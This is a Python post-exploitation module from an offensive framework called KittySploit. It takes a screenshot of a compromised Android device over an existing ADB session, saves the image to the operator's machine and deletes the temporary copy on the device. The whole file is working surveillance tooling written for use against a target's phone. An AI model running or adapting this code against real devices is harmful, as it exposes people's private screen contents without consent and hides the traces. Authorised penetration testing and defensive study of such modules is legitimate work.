from kittysploit import *
import os
import time
from typing import Any, Optional
from modules.post.adb.adb_session_utils import get_adb_device_info

class Module(Post):
    __info__ = {
        'name': 'Android Screenshot',
        'description': 'Take a screenshot of an Android device',
        'author': 'KittySploit Team',
        'session_type': SessionType.ANDROID,
    }

    def run(self):
        try:
            session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
            device, serial, _, _ = get_adb_device_info(self.framework, session_id_value)
            if not device:
                print_error("Could not resolve ADB device from session. Is the Android listener still running?")
                return False

            serial = serial or getattr(device, "serial", "device")
            ts = int(time.time())

            # Output path
            out_dir = os.path.join(os.getcwd(), "output", "adb", "screenshots")
            os.makedirs(out_dir, exist_ok=True)
            out_path = os.path.join(out_dir, f"{serial}_{session_id_value}_{ts}.png")

            # Try common ppadb methods if available.
            data = None

            # Some ppadb versions expose screencap() returning bytes
            if hasattr(device, "screencap"):
                try:
                    maybe = device.screencap()
                    if isinstance(maybe, (bytes, bytearray)):
                        data = bytes(maybe)
                except Exception:
                    pass

            # Some expose screenshot() returning bytes or PIL Image
            if data is None and hasattr(device, "screenshot"):
                try:
                    maybe = device.screenshot()
                    if isinstance(maybe, (bytes, bytearray)):
                        data = bytes(maybe)
                    elif hasattr(maybe, "save"):
                        # PIL Image-like
                        maybe.save(out_path)
                        print_success(f"Screenshot saved: {out_path}")
                        return True
                except Exception:
                    pass

            # Fallback: use shell screencap to /sdcard and pull if supported
            if data is None:
                remote = f"/sdcard/ks_{ts}.png"
                try:
                    device.shell(f"screencap -p {remote}")
                    if hasattr(device, "pull"):
                        device.pull(remote, out_path)
                        try:
                            device.shell(f"rm {remote}")
                        except Exception:
                            pass
                        print_success(f"Screenshot saved: {out_path}")
                        return True
                except Exception as e:
                    print_error(f"ADB screenshot failed: {e}")
                    return False

            if data is None:
                print_error("Could not capture screenshot (no supported method on this device/ppadb).")
                return False

            with open(out_path, "wb") as f:
                f.write(data)

            print_success(f"Screenshot saved: {out_path}")
            return True
        except Exception as e:
            print_error(f'Error: {e}')
            return False
